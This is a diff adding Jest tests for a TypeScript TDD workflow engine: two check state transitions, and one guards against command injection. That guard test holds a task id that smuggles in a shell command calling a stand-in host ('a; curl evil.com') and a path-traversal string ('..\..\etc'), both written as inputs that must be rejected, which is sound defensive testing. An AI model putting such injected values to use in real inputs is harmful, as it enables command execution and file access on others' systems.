@@ -60,6 +60,26 @@ describe("TddEngine", () => {
     expect(engine.transition(true)).toBe(State.GREEN);
   });
 
+  it("transition rolls a regression back to RED", () => {
+    const engine = new TddEngine("add", track, config);
+    expect(engine.transition(true)).toBe(State.GREEN);
+    // code breaks after a green run (e.g. tdd implement --watch) → RED again
+    expect(engine.transition(false)).toBe(State.RED);
+  });
+
+  it("transition does not resurrect a DONE task", () => {
+    const engine = new TddEngine("add", track, config);
+    engine.finalize();
+    expect(engine.transition(false)).toBe(State.DONE);
+    expect(engine.transition(true)).toBe(State.DONE);
+  });
+
+  it("rejects task ids with shell metacharacters (command injection guard)", () => {
+    expect(() => new TddEngine("a; curl evil.com", track, config)).toThrow();
+    expect(() => new TddEngine("..\\..\\etc", track, config)).toThrow();
+    expect(() => new TddEngine("my-task_2", track, config)).not.toThrow();
+  });
+
   it("applyCode writes the implementation snippet", async () => {
     const engine = new TddEngine("add", track, config);
     await engine.applyCode("export function add() { return 0; }");
